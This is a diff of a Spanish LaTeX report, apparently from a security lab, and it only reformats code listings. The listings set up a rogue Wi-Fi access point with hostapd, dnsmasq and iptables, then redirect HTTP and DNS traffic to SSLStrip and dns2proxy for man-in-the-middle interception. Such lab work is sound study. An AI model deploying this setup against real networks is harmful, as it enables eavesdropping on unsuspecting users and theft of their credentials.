@@ -31,60 +31,57 @@ utilizaremos la herramienta hostapd que nos permite levantar un AP rápidamente.
 
 \begin{enumerate}
 
-	\item Instalamos hostapd y luego lo configuramos con la información del AP que queremos levantar
+\item Instalamos hostapd y luego lo configuramos con la información del AP que queremos levantar
 	
-		\begin{lstlisting}[language=bash]
-		
-			$ sudo apt install hostapd
+\begin{lstlisting}[style=base]
+$ sudo apt install hostapd
 
-			---- /etc/hostapd/hostapd.conf ----
-			interface=wlan0
-			driver=nl80211
-			ssid=RoqueAPWifi
-			channel=6
-			--------------------------------------------
+---- /etc/hostapd/hostapd.conf ----
+interface=wlan0
+driver=nl80211
+ssid=RoqueAPWifi
+channel=6
+--------------------------------------------
+\end{lstlisting}
+		
+\item Configuramos el rango de IP que va a utilizar nuestra interfaz que va funcionar como rogue AP (wlan0 en nuestro caso) con ifconfig
 
-		\end{lstlisting}
-		
-		
-	\item Configuramos el rango de IP que va a utilizar nuestra interfaz que va funcionar como rogue AP (wlan0 en nuestro caso) con ifconfig
-		
-		\begin{lstlisting}[language=bash]
-			$ ifconfig wlan0 10.0.0.1/24 up
-		\end{lstlisting}
-		
-	\item Configuramos IP forwarding para que los paquetes de nuestra interfaz wlan0 (rogue AP) forwardee a la interfaz eth0 (la cual es la que provee conexion a internet).
-		
-		\begin{lstlisting}[language=bash]
-			$ iptables -t nat -F
-			$ iptables -F
-			$ iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
-			$ iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
-			$ echo '1' > /proc/sys/net/ipv4/ip_forward
-		\end{lstlisting}
-		
-	\item Instalamos y configuramos dnsmasq
-		
-		\begin{lstlisting}[language=bash]
-			$ sudo apt install dnsmasq
-			
-			--- /etc/dnsmasq.conf ---
-			log-facility=/var/log/dnsmasq.log
-			interface=wlan0
-			dhcp-range=10.0.0.10,10.0.0.250,12h
-			dhcp-option=3,10.0.0.1
-			dhcp-option=6,10.0.0.1
-			log-queries
-			---------------------------------
-			
-		\end{lstlisting}
-		
-	\item Finalmente, inicializamos los servicios hostapd y dnsmasq
-		
-		\begin{lstlisting}[language=bash]
-			$ service dnsmasq start	
-			$ service hostapd start
-		\end{lstlisting}
+\begin{lstlisting}[style=base]
+$ ifconfig wlan0 10.0.0.1/24 up
+\end{lstlisting}
+
+\item Configuramos IP forwarding para que los paquetes de nuestra interfaz wlan0 (rogue AP) forwardee a la interfaz eth0 (la cual es la que provee conexion a internet).
+
+\begin{lstlisting}[style=base]
+$ iptables -t nat -F
+$ iptables -F
+$ iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+$ iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
+$ echo '1' > /proc/sys/net/ipv4/ip_forward
+\end{lstlisting}
+
+\item Instalamos y configuramos dnsmasq
+
+\begin{lstlisting}[style=base]
+$ sudo apt install dnsmasq
+
+--- /etc/dnsmasq.conf ---
+log-facility=/var/log/dnsmasq.log
+interface=wlan0
+dhcp-range=10.0.0.10,10.0.0.250,12h
+dhcp-option=3,10.0.0.1
+dhcp-option=6,10.0.0.1
+log-queries
+---------------------------------
+
+\end{lstlisting}
+
+\item Finalmente, inicializamos los servicios hostapd y dnsmasq
+
+\begin{lstlisting}[style=base]
+$ service dnsmasq start	
+$ service hostapd start
+\end{lstlisting}
 	
 \end{enumerate}
 	
@@ -95,7 +92,7 @@ realizar nuestras pruebas de sniffing y MitM.
 Luego, para hacer MitM, hicimos algunas modificaciones para poder utilizar otros servicios que nos permitan interceptar y modificar los paquetes. Estas modificaciones 
 son para poder usar SSLStrip y dns2proxy y fueron incluidas también en el script ap.sh.
 
-\begin{lstlisting}[language=bash]
-	$ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
-	$ iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53	
+\begin{lstlisting}[style=base]
+$ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+$ iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53	
 \end{lstlisting}
